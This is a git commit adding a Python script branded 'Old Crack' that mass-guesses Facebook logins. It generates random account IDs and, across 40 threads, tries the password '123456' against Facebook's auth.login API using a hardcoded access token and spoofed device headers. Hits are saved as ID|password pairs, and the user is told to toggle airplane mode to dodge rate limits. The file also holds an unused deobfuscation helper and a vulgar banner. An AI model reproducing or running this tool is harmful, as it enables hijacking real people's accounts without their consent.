fe1751b67923034b2d733ad15fc624503478b8de
RISHI7654 <rishir@suiemail.com>
2024-10-14 18:15:48 +0530

    Add files via upload

---
+++ dec_ayan.py
@@ -0,0 +1,149 @@
+  import lzma
+import zlib
+import codecs
+import base64
+_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));
+#----------------------------[IMPORT/MODULE]-----------------------------------#
+import requests,bs4,json,os,sys,uuid,random,datetime,time,re
+import requests,bs4,json,os,sys,random,datetime,time,re
+import urllib3,rich,base64
+os.system('xdg-open https://www.facebook.com/profile.php?id=61551228050927')
+time.sleep(3)
+os.system('xdg-open https://www.facebook.com/profile.php?id=61551228050927')
+time.sleep(3)
+print('\n \033[1;92m[✓]\r\r\033[1;92m WELCOME. To INDRA X RISHI Tools....!')
+from rich.table import Table as me
+from rich.console import Console as sol
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as tred
+from rich.console import Group as gp
+from rich.panel import Panel as nel
+from rich.markdown import Markdown as mark
+from rich.columns import Columns as col
+from rich import pretty
+from rich.text import Text as tekz
+from time import localtime as lt
+print('\n \033[1;92m[✓]\r\r\033[1;92m WELCOME. To INDRA X RISHI Tools....!')
+from rich.markdown import Markdown as mark
+from rich.columns import Columns as col
+from rich import pretty
+from rich.text import Text as tekz
+from time import localtime as lt
+import os,time,random,json,sys,datetime
+try:
+    import requests
+except:
+    os.system("pip3 install requests")
+    import requests 
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+#-----------------------------[LINE]-----------------------------------#
+def lin():
+	print("\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;31m")
+
+#----------------------------[COLOR/CODE]-----------------------------------#
+A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
+#----------------------------[USER/AGENT]-----------------------------------#
+def amul():
+ ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_31"])
+ END = "[FBAN/FB4A;F"+"BAV/"+"106"+".0.0.26.68;FBBV/"+"106;F"+"BDM/{"+"density="+"3.0,wid"+"th=750"+",height=1334};FBLC/it_"+"IT;FBRV/106."+"0.0.26.6"+"8;FBCR/Etisalat"+"Afg"+"hanistan;FBMF/Infi"+"nix_"+"Note_8i;FBBD/Infi"+"nix_Note_8i;FBPN/c"+"om.facebook.katana"+";FBDV/I"+"nfinix_Note_8i_10_0;FBSV/10.0;FBOP/1;FBCA/"+"x86:armeabi-v7a;]",
+ ua = random.choice(["[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77))+";FBBV/"+str(random.randint(1111111,7777777))+";"+END])+END
+ return ua 
+
+
+#----------------------------[LOGO]-----------------------------------#
+logo = (f"""        
+\033[1;91m\033[1;41m\033[1;33m\033[;0m\033[1;91m\033[1;92m\033[38;5;46m 
+\033[1;34m _  _      ____  ____  _    
+\033[1;33m/ \/ \  /|/  _ \/  __\/ \ /\
+\033[1;32m| || |\ ||| | \||  \/|| | ||
+\033[1;31m| || | \||| |_/||    /| \_/|
+\033[1;35m\_/\_/  \|\____/\_/\_\\____/
+\033[1;37m =====LEGEND BOY INDRU-XD-H3R3===========
+
+\033[1;31m################################################
+\033[1;31m[\033[1;32m≈\033[1;31m]\033[1;33m DEVELOPER   :  INDRA X RISHI
+\033[1;31m[\033[1;32m≈\033[1;31m]\033[1;34m FACEBOOK    :  INDRA PRATAP SINGH
+\033[1;31m[\033[1;32m≈\033[1;31m]\033[1;37m STATUS      :  SAPNA KI CHUT
+\033[1;31m[\033[1;32m≈\033[1;31m]\033[1;36m GITHUB      :   INDRU
+\033[1;31m[\033[1;32m≈\033[1;31m]\033[1;37m VERSION     :  V:00:2
+\033[1;31m[\033[1;32m≈\033[1;31m]\033[1;39m TOOL        :  \033[1;34mOld Crack\033[1;32m
+\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+\033[1;31m[\033[1;32m≈\033[1;31m]\033[1;32m FB GROUP:\033[1;91m\033[1;41m\033[1;33mTermux Free Command World 2024\033[;0m\033[1;91m\033[1;92m\033[38;5;46m
+\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;31m""")
+#----------------------------[MAIN/DEF]-----------------------------------#
+def main():
+    user=[]
+    os.system("clear")
+    print(logo)
+    print(f'\033[1;31m[\033[1;32m=\033[1;31m] \033[1;32mEXAMPLE    \033[1;33m : \033[1;32m5000/10000/99999')
+    lin()
+    limit=input(f"\033[1;31m[\033[1;32m?\033[1;31m]\033[1;32m INPUT \033[1;31m\033[1;32m: ")
+    lin()
+    os.system('clear')
+    print(logo)
+    print(f'\033[1;31m[\033[1;32m1\033[1;31m] \033[1;32m2010-2014 ')
+    lin()
+    ask=input(f"\033[1;31m[\033[1;32m?\033[1;31m] INPUT \033[1;32m:\033[1;33m ")
+    lin()
+    if ask in["1"]:
+        newrin="10000"
+        for i in range(int(limit)):
+            data=str(random.choice(range(1000000000,1999999999)))
+            user.append(data)
+    with ThreadPool(max_workers=40) as Tx:
+        os.system('clear')
+        print(logo)
+        print(f'\x1b[38;5;196m[\x1b[38;5;46m=\x1b[38;5;196m]\x1b[38;5;46m TOTAL ID : {limit} \x1b[38;5;196m')
+        print(f'\x1b[38;5;196m[\x1b[38;5;46m+\x1b[38;5;196m]\x1b[38;5;46m TURN \x1b[38;5;196m[\x1b[38;5;46mON\x1b[38;5;196m/\x1b[38;5;46mOFF\x1b[38;5;196m]\x1b[38;5;46m AIRPLANE MODE EVERY 3 MIN')
+        lin()
+        for chin in user:
+            uid=newrin+chin
+            Tx.submit(login,uid)    
+loop=0
+oks=[]
+def login(uid):
+    global oks,loop
+    Session=requests.session()
+    try:
+        sys.stdout.write(f'\r\x1b[38;5;196m[\x1b[38;5;48mFINDING\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\033[1;32m{loop}\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK•{len(oks)}\x1b[38;5;196m]')
+        sys.stdout.flush()
+        for pw in ["123456"]:
+
+            headers = {
+    'authority': 'x.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'datr=fGz-ZlF53rsaUAFFKEvlybNK; sb=iGz-ZknhvmRUBpmEMSijMbZZ; m_pixel_ratio=2; wd=360x676',
+    'dpr': '2',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"Infinix X682C"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"10.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '980',
+}
+            rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
+            if "session_key" in rp:
+                print(f"\r\r\033[1;30m[\033[1;33mIndru\033[1;30m]\033[1;33m {uid} {A}•{G} {pw}")
+                open("/sdcard/INDRU-OLD-OK","a").write(uid+"|"+pw+"\n")
+                oks.append(uid)
+                break 
+            elif "www.facebook.com" in rp["error_msg"]:
+                print(f"\r\r\033[1;30m[\033[1;33mIndru\033[1;30m]\033[1;33m {uid} {A}•{G} {pw}")
+                open("/sdcard/INDRU-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                oks.append(uid)
+                break
+            else:continue
+        loop+=1
+    except:pass
+main()
+#----------------------------[CODE/END]-----------------------------------#
